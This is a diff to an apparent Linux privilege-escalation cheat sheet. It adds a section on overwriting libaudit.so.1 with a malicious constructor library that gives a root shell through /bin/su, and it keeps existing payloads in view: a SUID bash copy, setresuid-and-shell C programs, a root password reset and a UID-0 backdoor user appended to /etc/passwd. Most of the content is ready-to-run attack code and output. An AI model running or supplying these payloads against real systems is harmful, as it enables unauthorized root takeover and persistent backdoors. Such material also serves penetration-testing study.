@@ -10,7 +10,7 @@ cp /bin/bash /tmp/b && chmod +s /tmp/b
 ## C
 
 ```c
-#gcc payload.c -o payload
+//gcc payload.c -o payload
 int main(void){
     setresuid(0, 0, 0); #Set as user suid user
     system("/bin/sh");
@@ -19,7 +19,7 @@ int main(void){
 ```
 
 ```c
-#gcc payload.c -o payload
+//gcc payload.c -o payload
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/types.h>
@@ -30,6 +30,67 @@ int main(){
     return 0;
 }
 ```
+
+## Overwriting a file to escalate privileges
+
+### Common files
+
+* Add user with password to _/etc/passwd_
+* Change password inside _/etc/shadow_
+* Add user to sudoers in _/etc/sudoers_
+
+### Overwriting a library
+
+Check a library used by some binary, in this case `/bin/su`:
+
+```bash
+ldd /bin/su
+        linux-vdso.so.1 (0x00007ffef06e9000)
+        libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
+        libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
+        libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
+        libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
+```
+
+In this case lets try to impersonate `/lib/x86_64-linux-gnu/libaudit.so.1`.  
+So, check for functions of this library used by the **`su`** binary:
+
+```bash
+objdump -T /bin/su | grep audit
+0000000000000000      DF *UND*  0000000000000000              audit_open
+0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
+0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
+000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
+```
+
+The symbols `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` and `audit_fd` are probably from the libaudit.so.1 library. As the libaudit.so.1 will be overwritten by the malicious shared library, these symbols should be present in the new shared library, otherwise the program will not be able to find the symbol and will exit.
+
+```c
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+
+//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c
+
+int audit_open;
+int audit_log_acct_message;
+int audit_log_user_message;
+int audit_fd;
+
+void inject()__attribute__((constructor));
+
+void inject()
+{
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+}
+```
+
+Now, just calling **`/bin/su`** you will obtain a shell as root.
 
 ## Scripts
 
@@ -53,9 +114,5 @@ echo "root:hacked" | chpasswd
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
 
-### Add user to sudoers
-
-```bash
-echo "<username> ALL=NOPASSWD:ALL" >> /etc/sudoers
-```
+### 
 
